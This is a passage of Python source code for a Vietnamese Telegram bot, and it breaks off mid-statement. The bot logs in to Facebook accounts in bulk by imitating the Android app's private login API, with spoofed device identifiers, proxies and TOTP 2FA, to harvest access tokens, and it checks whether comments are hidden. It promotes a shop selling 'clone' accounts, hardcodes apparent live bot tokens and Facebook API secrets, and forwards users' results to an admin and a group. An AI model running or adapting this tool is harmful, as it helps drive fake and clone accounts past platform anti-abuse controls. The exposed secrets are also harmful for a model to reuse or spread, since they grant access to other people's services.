import base64
import io
import json
import os
import random
import string
import struct
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from flask import Flask
import pandas as pd
import pyotp
import requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.error import TelegramError
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ================= CẤU HÌNH WEB SERVER (FLASK) CHO RENDER =================
app_flask = Flask(__name__)


@app_flask.route("/")
def home():
  return "Bot is running!"


def run_flask():
  port = int(os.environ.get("PORT", 8080))
  app_flask.run(host="0.0.0.0", port=port)


# ================= CẤU HÌNH BOT =================
TELEGRAM_BOT_TOKEN = "8694132202:AAGdtE43NdakjEip6ZM5IAVvImRcYwoRbrM"
ADMIN_TELEGRAM_ID = 8800581554
USER_IDS_FILE = "users.json"
REQUIRED_GROUP_LINK = "https://t.me/+gJqK8zY7vk4yMjk1"
REQUIRED_GROUP_ID = -1004435579756  # Chat ID thực tế của nhóm

user_sessions = {}


def load_users():
  try:
    with open(USER_IDS_FILE, "r") as f:
      return set(json.load(f))
  except:
    return set()


def save_users(users_set):
  with open(USER_IDS_FILE, "w") as f:
    json.dump(list(users_set), f)

# ================= HÀM KIỂM TRA THÀNH VIÊN NHÓM =================
async def check_user_in_group(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
  if user_id == ADMIN_TELEGRAM_ID:
    return True

  try:
    member = await context.bot.get_chat_member(
        chat_id=REQUIRED_GROUP_ID, user_id=user_id
    )
    if member.status in ["member", "administrator", "creator"]:
      return True
    return False
  except Exception as e:
    print(f"Lỗi kiểm tra nhóm: {e}")
    return False

# ================= XỬ LÝ PROXY & FACEBOOK LOGIN =================
def format_proxy(proxy_str):
  if not proxy_str:
    return None
  proxy_str = proxy_str.strip()
  if "://" in proxy_str:
    scheme, rest = proxy_str.split("://", 1)
    parts = rest.split(":")
    if len(parts) == 4:
      ip, port, user, pwd = parts
      return f"{scheme}://{user}:{pwd}@{ip}:{port}"
    return proxy_str

  parts = proxy_str.split(":")
  if len(parts) == 4:
    ip, port, user, pwd = parts
    return f"http://{user}:{pwd}@{ip}:{port}"
  elif len(parts) == 2:
    return f"http://{proxy_str}"
  return f"http://{proxy_str}"


class FacebookPasswordEncryptor:

  @staticmethod
  def get_public_key(proxies=None):
    try:
      url = "https://b-graph.facebook.com/pwd_key_fetch"
      params = {
          "version": "2",
          "flow": "CONTROLLER_INITIALIZATION",
          "method": "GET",
          "fb_api_req_friendly_name": "pwdKeyFetch",
          "fb_api_caller_class": "com.facebook.auth.login.AuthOperations",
          "access_token": "438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
      }
      response = requests.post(
          url, params=params, proxies=proxies, timeout=15
      ).json()
      return response.get("public_key"), str(response.get("key_id", "25"))
    except Exception as e:
      raise Exception(f"Không thể lấy public key: {e}")

  @staticmethod
  def encrypt(password, public_key=None, key_id="25", proxies=None):
    if public_key is None:
      public_key, key_id = FacebookPasswordEncryptor.get_public_key(
          proxies=proxies
      )
    try:
      rand_key = get_random_bytes(32)
      iv = get_random_bytes(12)
      pubkey = RSA.import_key(public_key)
      cipher_rsa = PKCS1_v1_5.new(pubkey)
      encrypted_rand_key = cipher_rsa.encrypt(rand_key)

      cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
      current_time = int(time.time())
      cipher_aes.update(str(current_time).encode("utf-8"))
      encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(
          password.encode("utf-8")
      )

      buf = io.BytesIO()
      buf.write(bytes([1, int(key_id)]))
      buf.write(iv)
      buf.write(struct.pack("<h", len(encrypted_rand_key)))
      buf.write(encrypted_rand_key)
      buf.write(auth_tag)
      buf.write(encrypted_passwd)

      encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
      return f"#PWD_FB4A:2:{current_time}:{encoded}"
    except Exception as e:
      raise Exception(f"Lỗi mã hóa mật khẩu: {e}")


class FacebookLogin:
  API_URL = "https://b-graph.facebook.com/auth/login"
  ACCESS_TOKEN = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
  API_KEY = "882a8490361da98702bf97a021ddc14d"
  SIG = "214049b9f17c38bd767de53752b53946"

  BASE_HEADERS = {
      "content-type": "application/x-www-form-urlencoded",
      "x-fb-net-hni": "45201",
      "zero-rated": "0",
      "x-fb-sim-hni": "45201",
      "x-fb-connection-quality": "EXCELLENT",
      "x-fb-friendly-name": "authenticate",
      "authorization": "OAuth null",
      "x-fb-connection-type": "WIFI",
      "x-fb-http-engine": "Liger",
      "x-fb-client-ip": "True",
      "x-fb-server-cluster": "True",
  }

  def __init__(
      self,
      uid_phone_mail,
      password,
      twwwoo2fa="",
      machine_id=None,
      proxy=None,
  ):
    self.uid_phone_mail = uid_phone_mail
    self.twwwoo2fa = twwwoo2fa
    self.session = requests.Session()
    self.proxies = None
    if proxy:
      formatted_proxy = format_proxy(proxy)
      self.proxies = {"http": formatted_proxy, "https": formatted_proxy}
      self.session.proxies.update(self.proxies)

    if password.startswith("#PWD_FB4A"):
      self.password = password
    else:
      self.password = FacebookPasswordEncryptor.encrypt(
          password, proxies=self.proxies
      )

    self.device_id = str(uuid.uuid4())
    self.adid = str(uuid.uuid4())
    self.secure_family_device_id = str(uuid.uuid4())
    self.machine_id = (
        machine_id
        if machine_id
        else "".join(
            random.choices(string.ascii_letters + string.digits, k=24)
        )
    )
    self.jazoest = "".join(random.choices(string.digits, k=5))
    self.sim_serial = "".join(random.choices(string.digits, k=20))
    self.headers = self.BASE_HEADERS.copy()
    self.headers["user-agent"] = (
        "Dalvik/2.1.0 (Linux; U; Android 9; 23113RKC6C Build/PQ3A.190705.08211809)"
        " [FBAN/FB4A;FBAV/417.0.0.33.65;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/480086274;]"
    )

    self.data = {
        "format": "json",
        "email": self.uid_phone_mail,
        "password": self.password,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "locale": "vi_VN",
        "client_country_code": "VN",
        "api_key": self.API_KEY,
        "access_token": self.ACCESS_TOKEN,
        "adid": self.adid,
        "device_id": self.device_id,
        "generate_analytics_claim": "1",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": self.device_id,
        "secure_family_device_id": self.secure_family_device_id,
        "sim_serials": f'["{self.sim_serial}"]',
        "openid_flow": "android_login",
        "openid_provider": "google",
        "openid_tokens": "[]",
        "account_switcher_uids": f'["{self.uid_phone_mail}"]',
        "source": "login",
        "machine_id": self.machine_id,
        "jazoest": self.jazoest,
        "meta_inf_fbmeta": "V2_UNTAGGED",
        "advertiser_id": self.adid,
        "currently_logged_in_userid": "0",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "sig": self.SIG,
    }

  def _handle_2fa(self, error_data):
    if not self.twwwoo2fa:
      return {"success": False, "error": "Cần mã 2FA nhưng chưa được cung cấp"}
    try:
      twofactor_code = pyotp.TOTP(self.twwwoo2fa).now()
      data_2fa = {
          "locale": "vi_VN",
          "format": "json",
          "email": self.uid_phone_mail,
          "device_id": self.device_id,
          "access_token": self.ACCESS_TOKEN,
          "generate_session_cookies": "true",
          "generate_machine_id": "1",
          "twofactor_code": twofactor_code,
          "credentials_type": "two_factor",
          "error_detail_type": "button_with_disabled",
          "first_factor": error_data["login_first_factor"],
          "password": self.password,
          "userid": error_data["uid"],
          "machine_id": error_data["login_first_factor"],
      }
      response = self.session.post(
          self.API_URL, data=data_2fa, headers=self.headers, timeout=15
      )
      res_json = response.json()
      if "access_token" in res_json:
        return {"success": True, "access_token": res_json["access_token"]}
      return {
          "success": False,
          "error": res_json.get("error", {}).get("message", "Lỗi 2FA"),
      }
    except Exception as e:
      return {"success": False, "error": str(e)}

  def login(self):
    try:
      response = self.session.post(
          self.API_URL, headers=self.headers, data=self.data, timeout=15
      )
      res_json = response.json()
      if "access_token" in res_json:
        return {"success": True, "access_token": res_json["access_token"]}
      if "error" in res_json:
        error_data = res_json.get("error", {}).get("error_data", {})
        if "login_first_factor" in error_data and "uid" in error_data:
          return self._handle_2fa(error_data)
        return {
            "success": False,
            "error": res_json["error"].get("message", "Lỗi đăng nhập"),
        }
      return {"success": False, "error": "Phản hồi không xác định"}
    except Exception as e:
      return {"success": False, "error": str(e)}

# ==================== LOGIC CHECK COMMENT ====================
def extract_comment_id(url):
  url_str = str(url)
  if "comment_id=" in url_str:
    try:
      return url_str.split("comment_id=")[1].split("&")[0]
    except Exception:
      return None
  return None


def check_single_comment(comment_id, token):
  if not comment_id:
    return "Đã bị xóa", False

  api_url = f"https://graph.facebook.com/v19.0/{comment_id}?access_token={token}"
  try:
    response = requests.get(api_url, timeout=10)
    if response.status_code != 200:
      data = response.json()
      err = data.get("error", {})
      if err.get("code") in [190, 4, 17, 32] or "access token" in str(
          err.get("message", "")
      ).lower():
        return "TOKEN_DIE", True
      return "Đã bị xóa", False

    data = response.json()
    return ("Còn tồn tại" if "id" in data else "Đã bị xóa"), False
  except:
    return "NETWORK_ERROR", True


def worker_thread(
    user_id,
    thread_id,
    links_subset,
    initial_token,
    delay_time,
    results_storage,
    stats_counter,
    session_data,
):
  current_token = initial_token
  local_results = []
  for original_index, url in links_subset:
    comment_id = extract_comment_id(url)
    while True:
      status, is_error = check_single_comment(comment_id, current_token)
      if is_error:
        stop_event = threading.Event()
        with session_data["lock"]:
          session_data["paused_threads"][thread_id] = {
              "url": url,
              "event": stop_event,
              "new_token": None,
          }
        try:
          requests.post(
              f"https://api.telegram.org/bot{session_data['bot_token']}/sendMessage",
              json={
                  "chat_id": user_id,
                  "text": (
                      f"🚨 **[LUỒNG {thread_id}] LỖI TOKEN/MẠNG!**\n🔗 Link:"
                      f" `{url}`\n👉 Gửi token mới để tiếp tục."
                  ),
                  "parse_mode": "Markdown",
              },
          )
        except:
          pass
        stop_event.wait()
        with session_data["lock"]:
          current_token = session_data["paused_threads"][thread_id]["new_token"]
        continue

      local_results.append((original_index, url, status))
      with stats_counter["lock"]:
        stats_counter["checked"] += 1
        if status == "Còn tồn tại":
          stats_counter["hien"] += 1
        else:
          stats_counter["an"] += 1
      break
    time.sleep(delay_time)
  results_storage.extend(local_results)

# ================= QUẢN LÝ TRẠNG THÁI & HANDLERS =================
user_states = {}
notified_joined = set()


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
  user = update.effective_user
  user_id = user.id
  chat = update.effective_chat

  if chat.type in ["group", "supergroup"]:
    bot_username = context.bot.username
    private_link = f"https://t.me/{bot_username}?start=start"
    keyboard = [
        [InlineKeyboardButton("💬 Nhắn tin riêng với Bot", url=private_link)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = (
        f"⚠️ **Xin chào {user.first_name}!**\n\nVui lòng **không sử dụng bot"
        " trong nhóm chat chung** để tránh bị lộ thông tin tài khoản.\n\n👉 Hãy"
        " bấm vào nút bên dưới để chuyển sang khung chat riêng với bot nhé!"
    )
    if update.message:
      await update.message.reply_text(
          text, reply_markup=reply_markup, parse_mode="Markdown"
      )
    return

  is_member = await check_user_in_group(user_id, context)
  if not is_member:
    if user_id in notified_joined:
      notified_joined.remove(user_id)
    keyboard = [
        [InlineKeyboardButton("🔗 Tham gia nhóm ngay", url=REQUIRED_GROUP_LINK)],
        [InlineKeyboardButton("🔄 Kiểm tra lại", callback_data="check_membership")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = (
        f"⚠️ **Bạn chưa đủ điều kiện sử dụng bot!**\n\nVui lòng tham gia nhóm"
        f" [tại đây]({REQUIRED_GROUP_LINK}) để có thể tiếp tục sử dụng bot."
    )
    if update.message:
      await update.message.reply_text(
          text,
          reply_markup=reply_markup,
          parse_mode="Markdown",
          disable_web_page_preview=True,
      )
    elif update.callback_query:
      await update.callback_query.message.edit_text(
          text,
          reply_markup=reply_markup,
          parse_mode="Markdown",
          disable_web_page_preview=True,
      )
    return

  if user_id not in notified_joined:
    notified_joined.add(user_id)

  users = load_users()
  users.add(user_id)
  save_users(users)

  if user_id in user_states:
    del user_states[user_id]
  if user_id in user_sessions:
    del user_sessions[user_id]

  keyboard = [
      [InlineKeyboardButton("🔑 Get Token", callback_data="menu_gettoken")],
      [InlineKeyboardButton("🔍 Check Cmt Ẩn/Hiện", callback_data="menu_check_cmt")],
      [InlineKeyboardButton("🛒 Mua Clone", url="https://t.me/clonegiareok_bot")],
      [InlineKeyboardButton("📞 Liên hệ Admin", url="https://t.me/phucvan99")],
  ]
  reply_markup = InlineKeyboardMarkup(keyboard)
  text = f"👋 **Xin chào {user.first_name}!**\n\nVui lòng chọn tính năng bên dưới:"

  if update.message:
    await update.message.reply_text(
        text, reply_markup=reply_markup, parse_mode="Markdown"
    )
  elif update.callback_query:
    await update.callback_query.message.edit_text(
        text, reply_markup=reply_markup, parse_mode="Markdown"
    )


async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
  user = update.effective_user
  if user.id != ADMIN_TELEGRAM_ID:
    await update.message.reply_text("⛔ Bạn không có quyền sử dụng lệnh này!")
    return

  keyboard = [
      [
          InlineKeyboardButton(
              "📢 Gửi thông báo cho tất cả thành viên",
              callback_data="admin_broadcast",
          )
      ],
      [InlineKeyboardButton("⬅️ Thoát", callback_data="menu_back")],
  ]
  reply_markup = InlineKeyboardMarkup(keyboard)
  await update.message.reply_text(
      "🛠️ **BẢNG ĐIỀU KHIỂN ADMIN**\n\nVui lòng chọn thao tác:",
      reply_markup=reply_markup,
      parse_mode="Markdown",
  )


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
  query = update.callback_query
  await query.answer()
  user_id = query.from_user.id

  if query.data == "check_membership":
    await start(update, context)
    return

  is_member = await check_user_in_group(user_id, context)
  if not is_member:
    keyboard = [
        [InlineKeyboardButton("🔗 Tham gia nhóm ngay", url=REQUIRED_GROUP_LINK)],
        [InlineKeyboardButton("🔄 Kiểm tra lại", callback_data="check_membership")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.message.edit_text(
        "⚠️ **Bạn đã rời nhóm nên tính năng đã bị khóa!**\n\nVui lòng tham gia lại"
        " nhóm để tiếp tục.",
        reply_markup=reply_markup,
        parse_mode="Markdown",
    )
    return

  if query.data == "menu_gettoken":
    keyboard = [
        [InlineKeyboardButton("❌ Không có 2FA", callback_data="type_no2fa")],
        [InlineKeyboardButton("🛡️ Có 2FA", callback_data="type_has2fa")],
        [InlineKeyboardButton("⬅️ Quay lại", callback_data="menu_back")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.message.edit_text(
        "📌 **Chọn loại tài khoản muốn Get Token:**",
        reply_markup=reply_markup,
        parse_mode="Markdown",
    )

  elif query.data == "menu_check_cmt":
    user_sessions[user_id] = {"step": "waiting_for_file"}
    keyboard = [[InlineKeyboardButton("⬅️ Quay lại", callback_data="menu_back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.message.edit_text(
        "📂 **Gửi file Excel (.xlsx)** chứa danh sách link cần check"
        " comment:\n*(Link nằm ở cột đầu tiên của file)*",
        reply_markup=reply_markup,
        parse_mode="Markdown",
    )

  elif query.data == "menu_back":
    if user_id in user_sessions:
      del user_sessions[user_id]
    await start(update, context)

  elif query.data == "admin_broadcast":
    if user_id != ADMIN_TELEGRAM_ID:
      return
    user_states[user_id] = {"step": "wait_broadcast_msg"}
    await query.message.edit_text(
        "📢 **GỬI THÔNG BÁO TOÀN BỘ THÀNH VIÊN**\n\nVui lòng gửi nội dung thông"
        " báo:",
        parse_mode="Markdown",
    )

  elif query.data in ["type_no2fa", "type_has2fa"]:
    has_2fa = query.data == "type_has2fa"
    user_states[user_id] = {"step": "wait_accounts", "has_2fa": has_2fa}
    syntax = "UID|PASS|COOKIE" if not has_2fa else "UID|PASS|2FA|COOKIE"
    await query.message.edit_text(
        f"📝 **Bước 1/3: Gửi danh sách tài khoản**\nMỗi dòng 1 tài khoản theo"
        f" định dạng:\n`{syntax}`",
        parse_mode="Markdown",
    )

  elif query.data in ["proxy_yes", "proxy_no"]:
    use_proxy = query.data == "proxy_yes"
    if user_id not in user_states:
      await query.message.edit_text(
          "⚠️ Phiên làm việc đã hết hạn. Vui lòng bấm /start để bắt đầu lại."
      )
      return
    user_states[user_id]["use_proxy"] = use_proxy
    if use_proxy:
      user_states[user_id]["step"] = "wait_proxies"
      await query.message.edit_text(
          "📝 **Bước 3/3: Gửi danh sách Proxy**\nMỗi dòng 1 proxy"
          " (`ip:port:user:pass`)",
          parse_mode="Markdown",
      )
    else:
      await query.message.edit_text(
          "🚀 Đang tiến hành xử lý tài khoản, vui lòng đợi..."
      )
      await process_run(update, context, user_id, proxies=[])


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
  user = update.effective_user
  user_id = user.id

  is_member = await check_user_in_group(user_id, context)
  if not is_member:
    return

  # Xử lý check cmt đang bị tạm dừng (đợi token mới)
  if user_id in user_sessions and user_sessions[user_id].get("paused_threads"):
    new_token = update.message.text.strip()
    session = user_sessions[user_id]
    with session["lock"]:
      target_id = list(session["paused_threads"].keys())[0]
      session["paused_threads"][target_id]["new_token"] = new_token
      session["paused_threads"][target_id]["event"].set()
      del session["paused_threads"][target_id]
    await update.message.reply_text(
        "✅ Đã nhận token mới. Tiến trình tiếp tục chạy..."
    )
    return

  # Xử lý nhập file Excel trong Check Cmt
  if user_id in user_sessions and user_sessions[user_id].get(
      "step"
  ) == "waiting_for_file":
    if not update.message.document:
      await update.message.reply_text("⚠️ Vui lòng gửi file định dạng Excel (.xlsx)!")
      return
    file = await context.bot.get_file(update.message.document.file_id)
    file_path = f"temp_{user_id}.xlsx"
    await file.download_to_drive(file_path)
    try:
      df = pd.read_excel(file_path)
      links = list(df[df.columns[0]])
      user_sessions[user_id].update(
          {
              "step": "waiting_for_tokens",
              "file_path": file_path,
              "links": links,
              "user_display": (
                  f"@{user.username}" if user.username else user.first_name
              ),
          }
      )
      await update.message.reply_text(
          "✅ Đã nhận file thành công!\n\nTiếp theo, hãy **gửi danh sách Token Facebook**"
          " (mỗi dòng 1 Token):"
      )
    except Exception as e:
      await update.message.reply_text(f"❌ Lỗi đọc file Excel: {e}")
    return

  # Xử lý nhập Token trong Check Cmt và chạy tiến trình
  if user_id in user_sessions and user_sessions[user_id].get(
      "step"
  ) == "waiting_for_tokens":
    tokens = [
        line.strip() for line in update.message.text.split("\n") if line.strip()
    ]
    if not tokens:
      await update.message.reply_text(
          "⚠️ Danh sách token trống. Vui lòng gửi lại!"
      )
      return

    session = user_sessions[user_id]
    file_path = session["file_path"]
    links = session["links"]
    user_display = session.get("user_display", f"ID: {user_id}")

    session_data = {
        "bot_token": context.bot.token,
        "paused_threads": {},
        "lock": threading.Lock(),
    }
    user_sessions[user_id].update(session_data)

    def run_checking_process():
      try:
        df_original = pd.read_excel(file_path)
        indexed_links = list(enumerate(links))
        total_links = len(indexed_links)

        # Gửi tin nhắn thanh tiến trình ban đầu
        progress_msg_res = requests.post(
            f"https://api.telegram.org/bot{context.bot.token}/sendMessage",
            json={
                "chat_id": user_id,
                "text": (
                    "⏳ **Đang tiến hành check comment...**\n"
                    "🔄 Tiến độ: `[░░░░░░░░░░] 0%`\n"
                    f"📊 Đã check: `0/{total_links}`\n"
                    "🟢 Còn hiện: `0` | 🔴 Đã ẩn/xóa: `0`"
                ),
                "parse_mode": "Markdown",
            },
        ).json()
        
        msg_id = progress_msg_res.get("result", {}).get("message_id")

        num_threads = min(len(tokens), 5)
        chunk_size = len(indexed_links) // num_threads if num_threads > 0 else len(indexed_links)
        chunks = []
        for i in range(num_threads):
          start_idx = i * chunk_size
          end_idx = (
              (i + 1) * chunk_size if i != num_threads - 1 else len(indexed_links)
          )
          chunks.append(indexed_links[start_idx:end_idx])

        results_storage = []
        stats_counter = {
            "checked": 0,
            "hien": 0,
            "an": 0,
            "lock": threading.Lock(),
        }
        threads = []

        # Luồng cập nhật thanh tiến trình liên tục theo thời gian thực
        stop_progress_event = threading.Event()
        def update_progress_bar():
          last_checked = -1
          while not stop_progress_event.is_set():
            with stats_counter["lock"]:
              current_checked = stats_counter["checked"]
              current_hien = stats_counter["hien"]
              current_an = stats_counter["an"]
            
            if current_checked != last_checked and msg_id:
              last_checked = current_checked
              percent = int((current_checked / total_links) * 100) if total_links > 0 else 0
              filled_blocks = int(percent / 10)
              bar = "█" * filled_blocks + "░" * (10 - filled_blocks)
              
              try:
                requests.post(
                    f"https://api.telegram.org/bot{context.bot.token}/editMessageText",
                    json={
                        "chat_id": user_id,
                        "message_id": msg_id,
                        "text": (
                            "⏳ **Đang tiến hành check comment...**\n"
                            f"🔄 Tiến độ: `[{bar}] {percent}%`\n"
                            f"📊 Đã check: `{current_checked}/{total_links}`\n"
                            f"🟢 Còn hiện: `{current_hien}` | 🔴 Đã ẩn/xóa: `{current_an}`"
                        ),
                        "parse_mode": "Markdown",
                    },
                )
              except:
                pass
            
            if current_checked >= total_links:
              break
            time.sleep(1.0)

        progress_thread = threading.Thread(target=update_progress_bar)
        progress_thread.start()

        for i in range(num_threads):
          t = threading.Thread(
              target=worker_thread,
              args=(
                  user_id,
                  i + 1,
                  chunks[i],
                  tokens[i % len(tokens)],
                  0.5,  # Delay 0.5 giây
                  results_storage,
                  stats_counter,
                  session_data,
              ),
          )
          threads.append(t)
          t.start()

        for t in threads:
          t.join()

        stop_progress_event.set()
        progress_thread.join()

        status_map = {orig_idx: status for orig_idx, url, status in results_storage}
        df_original["Trạng thái"] = [
            status_map.get(i, "Lỗi") for i in range(len(df_original))
        ]

        live_df = df_original[df_original["Trạng thái"] == "Còn tồn tại"]
        dead_df = df_original[df_original["Trạng thái"] != "Còn tồn tại"]

        live_file = f"Cmt_Hien_{user_id}.xlsx"
        dead_file = f"Cmt_An_{user_id}.xlsx"
        live_df.to_excel(live_file, index=False)
        dead_df.to_excel(dead_file, index=False)

        # Cập nhật tin nhắn thành công hoàn toàn cho user
        if msg_id:
          try:
            requests.post(
                f"https://api.telegram.org/bot{context.bot.token}/editMessageText",
                json={
                    "chat_id": user_id,
                    "message_id": msg_id,
                    "text": (
                        f"✅ **Đã hoàn tất check {total_links}/{total_links} link!**\n"
                        f"🟢 Còn hiện: `{stats_counter['hien']}` | 🔴 Đã ẩn/xóa: `{stats_counter['an']}`\n"
                        "📂 Đang gửi file kết quả..."
                    ),
                    "parse_mode": "Markdown",
                },
            )
          except:
            pass

        # Gửi file kết quả cho User
        for f_path, caption in [
            (live_file, "✅ Danh sách Cmt Còn Hiện"),
            (dead_file, "❌ Danh sách Cmt Đã Bị Ẩn/Xóa"),
        ]:
          with open(f_path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{context.bot.token}/sendDocument",
                data={"chat_id": user_id, "caption": caption},
                files={"document": f},
            )

        # --- BÁO CÁO CHO ADMIN ---
        requests.post(
            f"https://api.telegram.org/bot{context.bot.token}/sendMessage",
            json={
                "chat_id": ADMIN_TELEGRAM_ID,
                "text": (
                    f"📊 **BÁO CÁO CHECK CMT**\n👤 User: {user_display}"
                    f" (`{user_id}`)\n🟢 Hiện: {stats_counter['hien']} | 🔴"
                    f" Ẩn: {stats_counter['an']}"
                ),
                "parse_mode": "Markdown",
            },
        )
        for f_path, caption in [
            (live_file, f"Cmt Hiện - {user_display}"),
            (dead_file, f"Cmt Ẩn - {user_display}"),
        ]:
          with open(f_path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{context.bot.token}/sendDocument",
                data={"chat_id": ADMIN_TELEGRAM_ID, "caption": caption},
                files={"document": f},
            )

        # --- BÁO CÁO VỀ NHÓM (Dùng Async loop trong thread hoặc gọi đồng bộ bot qua yêu cầu HTTP chuẩn) ---
        try:
          group_text = (
              f"📊 **BÁO CÁO CHECK CMT**\n👤 User: {user_display}"
              f" (`{user_id}`)\n🟢 Hiện: {stats_counter['hien']} | 🔴"
              f" Ẩn: {stats_counter['an']}"
          )
          # Gửi tin nhắn text vào nhóm
          requests.post(
              f"https://api.telegram.org/bot{context.bot.token}/sendMessage",
              json={
                  "chat_id": REQUIRED_GROUP_ID,
                  "text": group_text,
                  "parse_mode": "Markdown",
              }
          )
          # Gửi file vào nhóm bằng requests.post trực tiếp với đúng định dạng multipart
          for f_path, caption in [
              (live_file, f"Cmt Hiện - {user_display}"),
              (dead_file, f"Cmt Ẩn - {user_display}"),
          ]:
            with open(f_path, "rb") as f:
              requests.post(
                  f"https://api.telegram.org/bot{context.bot.token}/sendDocument",
                  data={"chat_id": REQUIRED_GROUP_ID, "caption": caption},
                  files={"document": f},
              )
        except Exception as e:
          print(f"Lỗi gửi báo cáo vào nhóm: {e}")

        # Dọn dẹp file tạm
        for f in [file_path, live_file, dead_file]:
          if os.path.exists(f):
            os.remove(f)
        if user_id in user_sessions:
          del user_sessions[user_id]

      except Exception as e:
        requests.post(
            f"https://api.telegram.org/bot{context.bot.token}/sendMessage",
            json={
                "chat_id": user_id,
                "text": f"❌ Đã xảy ra lỗi trong quá trình xử lý: {e}",
            },
        )

    threading.Thread(target=run_checking_process).start()
    return

  # Xử lý các bước Get Token cũ
  if user_id not in user_states:
    return
  text = update.message.text.strip()
  state = user_states[user_id]
  step = state.get("step")

  if step == "wait_broadcast_msg":
    if user_id != ADMIN_TELEGRAM_ID:
      del user_states[user_id]
      return
    del user_states[user_id]
    users = load_users()
    success_count, fail_count = 0, 0
    await update.message.reply_text(
        f"🚀 Đang tiến hành gửi thông báo đến {len(users)} thành viên..."
    )
    for chat_id in users:
      try:
        broadcast_msg = (
            f"📢 THÔNG BÁO TỪ BOT\n━━━━━━━━━━━━━━━━━━\n\n{text}"
        )
        await context.bot.send_message(
            chat_id=chat_id, text=broadcast_msg, parse_mode="Markdown"
        )
        success_count += 1
        time.sleep(0.1)
      except:
        fail_count += 1
    await update.message.reply_text(
        f"✅ **Đã gửi xong!**\n- Thành công: {success_count}\n- Thất bại:"
        f" {fail_count}",
        parse_mode="Markdown",
    )
    return

  if step == "wait_accounts":
    accounts = [line.strip() for line in text.split("\n") if line.strip()]
    if not accounts:
      await update.message.reply_text(
          "⚠️ Danh sách tài khoản trống. Vui lòng gửi lại!"
      )
      return
    state["accounts"] = accounts
    state["step"] = "wait_proxy_choice"
    keyboard = [
        [InlineKeyboardButton("✅ Có dùng Proxy", callback_data="proxy_yes")],
        [InlineKeyboardButton("❌ Không dùng Proxy", callback_data="proxy_no")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"✅ Đã nhận **{len(accounts)} tài khoản**.\n\nBạn có muốn sử dụng Proxy"
        " không?",
        reply_markup=reply_markup,
        parse_mode="Markdown",
    )

  elif step == "wait_proxies":
    proxies = [line.strip() for line in text.split("\n") if line.strip()]
    accounts = state["accounts"]
    if not proxies:
      await update.message.reply_text(
          "⚠️ Danh sách proxy trống. Vui lòng gửi lại!"
      )
      return
    mapped_proxies = [proxies[i % len(proxies)] for i in range(len(accounts))]
    state["proxies"] = mapped_proxies
    await update.message.reply_text(
        "🚀 Đang tiến hành xử lý tài khoản với đa luồng, vui lòng đợi..."
    )
    await process_run(update, context, user_id, proxies=mapped_proxies)


def worker_task(acc_line, proxy_line, has_2fa):
  try:
    parts = acc_line.split("|")
    if has_2fa:
      if len(parts) < 4:
        return {
            "success": False,
            "uid": parts[0] if len(parts) > 0 else "Unknown",
            "error": "Thiếu thông tin 2FA/Cookie",
            "acc_line": acc_line,
            "proxy": proxy_line,
        }
      uid, password, twwwoo2fa, cookie = (
          parts[0],
          parts[1],
          parts[2].replace(" ", ""),
          parts[3],
      )
    else:
      if len(parts) < 3:
        return {
            "success": False,
            "uid": parts[0] if len(parts) > 0 else "Unknown",
            "error": "Thiếu thông tin Cookie",
            "acc_line": acc_line,
            "proxy": proxy_line,
        }
      uid, password, cookie = parts[0], parts[1], parts[2]
      twwwoo2fa = ""

    machine_id = None
    if "datr=" in cookie:
      try:
        machine_id = cookie.split("datr=")[1].split(";")[0]
      except:
        pass

    fb = FacebookLogin(
        uid_phone_mail=uid,
        password=password,
        twwwoo2fa=twwwoo2fa,
        machine_id=machine_id,
        proxy=proxy_line,
    )
    result = fb.login()
    if result["success"]:
      return {
          "success": True,
          "uid": uid,
          "token": result["access_token"],
          "acc_line": acc_line,
          "proxy": proxy_line,
      }
    else:
      return {
          "success": False,
          "uid": uid,
          "error": result.get("error"),
          "acc_line": acc_line,
          "proxy": proxy_line,
      }
  except Exception as e:
    return {
        "success": False,
        "uid": "Unknown",
        "error": str(e),
        "acc_line": acc_line,
        "proxy": proxy_line,
    }


async def process_run(
    update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, proxies: list
):
  user = update.effective_user
  state = user_states.get(user_id)
  if not state:
    return

  accounts = state["accounts"]
  has_2fa = state["has_2fa"]
  if user_id in user_states:
    del user_states[user_id]

  results_text = "📊 **KẾT QUẢ GET TOKEN:**\n\n"
  username_str = (
      f"@{user.username}" if user.username else f"{user.first_name} (ID: {user.id})"
  )
  max_workers = min(15, len(accounts)) if len(accounts) > 0 else 1
  successful_accounts, successful_proxies = [], []

  with ThreadPoolExecutor(max_workers=max_workers) as executor:
    futures = []
    for i, acc in enumerate(accounts):
      p = proxies[i] if proxies and i < len(proxies) else None
      futures.append(executor.submit(worker_task, acc, p, has_2fa))

    for future in as_completed(futures):
      res = future.result()
      if res["success"]:
        results_text += (
            f"✅ `UID: {res['uid']}`\nToken: `{res['token']}`\n\n"
        )
        successful_accounts.append(res["acc_line"])
        successful_proxies.append(res["proxy"] if res["proxy"] else "Không dùng")
      else:
        results_text += (
